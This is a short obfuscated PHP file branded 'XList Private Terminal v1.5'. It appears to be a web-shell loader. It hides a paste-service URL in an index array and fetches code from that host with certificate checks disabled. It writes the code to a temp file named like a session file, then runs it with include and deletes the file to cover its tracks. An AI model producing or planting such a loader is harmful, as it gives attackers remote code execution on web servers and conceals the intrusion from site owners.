<?php
/*   __________________________________________________
~~~~|            ./XList Private Terminal v1.5         |
~~~~|              Hak Cipta (c) 2025 ./XList          |
~~~~|             Telegram: https://t.me/xl1st         |
~~~~|__________________________________________________|
*/
  $wNEl=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$hCZO=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 58, 56, 1, 52, 55, 57, 0, 58, 66, 56, 53, 58, 53, 66, 56, 61, 59, 53, 66, 61, 61, 54, 4, 66, 58, 59, 59, 4, 57, 57, 60, 2, 57, 1, 54, 1];$LMIq='';foreach($hCZO as $prbQ){$LMIq.=$wNEl[$prbQ];}$wyCw="$LMIq";function AkZm($undefined){$tqlq=curl_init();curl_setopt($tqlq,CURLOPT_URL,$undefined);curl_setopt($tqlq,CURLOPT_RETURNTRANSFER,true);curl_setopt($tqlq,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($tqlq,CURLOPT_SSL_VERIFYHOST,false);$RbXa=curl_exec($tqlq);curl_close($tqlq);return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($RbXa))))));}try{call_zVuS_func();}catch(Throwable $e){$BfHB=tempnam(sys_get_temp_dir(),'sess_'.md5($wyCw));file_put_contents($BfHB,gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(AkZm($wyCw))))))));include($BfHB);unlink($BfHB);exit;}?>